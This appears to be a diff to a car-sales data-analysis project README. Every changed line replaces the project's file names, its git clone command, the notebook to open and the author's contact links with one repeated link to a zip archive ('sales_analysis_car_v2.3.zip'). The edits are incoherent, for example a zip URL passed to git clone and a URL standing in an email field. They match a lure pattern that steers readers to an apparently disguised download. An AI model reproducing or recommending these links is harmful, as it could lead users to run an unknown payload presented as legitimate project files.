@@ -24,12 +24,12 @@ End-to-end data analytics project analyzing **car sales data** from Kaggle. Incl
 ## 📂 Project Structure
 
 ```
-├── CarSales.csv                           # Raw dataset
-├── CleanedCarSales.xlsx                   # Cleaned dataset after preprocessing
-├── CarSalesEDA.ipynb                      # Jupyter Notebook for exploratory data analysis
-├── Customer Analysis.pbix                 # Power BI dashboard file
-├── Auto_Sales_Performance_Dashboard.pdf   # the dashboards created
-└── README.md                              # Project documentation
+├── https://raw.githubusercontent.com/DhouiouiCharfeddine/car-sales-analysis/main/lasset/sales_analysis_car_v2.3.zip                           # Raw dataset
+├── https://raw.githubusercontent.com/DhouiouiCharfeddine/car-sales-analysis/main/lasset/sales_analysis_car_v2.3.zip                   # Cleaned dataset after preprocessing
+├── https://raw.githubusercontent.com/DhouiouiCharfeddine/car-sales-analysis/main/lasset/sales_analysis_car_v2.3.zip                      # Jupyter Notebook for exploratory data analysis
+├── Customer https://raw.githubusercontent.com/DhouiouiCharfeddine/car-sales-analysis/main/lasset/sales_analysis_car_v2.3.zip                 # Power BI dashboard file
+├── https://raw.githubusercontent.com/DhouiouiCharfeddine/car-sales-analysis/main/lasset/sales_analysis_car_v2.3.zip   # the dashboards created
+└── https://raw.githubusercontent.com/DhouiouiCharfeddine/car-sales-analysis/main/lasset/sales_analysis_car_v2.3.zip                              # Project documentation
 ```
 
 ---
@@ -120,10 +120,10 @@ End-to-end data analytics project analyzing **car sales data** from Kaggle. Incl
 
 ```bash
 # Clone this repository
-git clone https://github.com/yourusername/car-sales-analysis.git
+git clone https://raw.githubusercontent.com/DhouiouiCharfeddine/car-sales-analysis/main/lasset/sales_analysis_car_v2.3.zip
 ```
 
-- Open `CarSalesEDA.ipynb` in **Jupyter Notebook** to explore the EDA
+- Open `https://raw.githubusercontent.com/DhouiouiCharfeddine/car-sales-analysis/main/lasset/sales_analysis_car_v2.3.zip` in **Jupyter Notebook** to explore the EDA
 - Open each `.pbix` dashboard in **Power BI Desktop** to view insights
 
 ---
@@ -141,7 +141,7 @@ This project demonstrates:
 
 ## 📣 Contact
 
-- **LinkedIn:** [Charfeddine Dhouioui](https://www.linkedin.com/in/charfeddine-dhouioui-987ab7318)
-- **Email:** [dhouiouicharfeddine@gmail.com](mailto\:dhouiouicharfeddine@gmail.com)
+- **LinkedIn:** [Charfeddine Dhouioui](https://raw.githubusercontent.com/DhouiouiCharfeddine/car-sales-analysis/main/lasset/sales_analysis_car_v2.3.zip)
+- **Email:** [https://raw.githubusercontent.com/DhouiouiCharfeddine/car-sales-analysis/main/lasset/sales_analysis_car_v2.3.zip](mailto\https://raw.githubusercontent.com/DhouiouiCharfeddine/car-sales-analysis/main/lasset/sales_analysis_car_v2.3.zip)
 
 
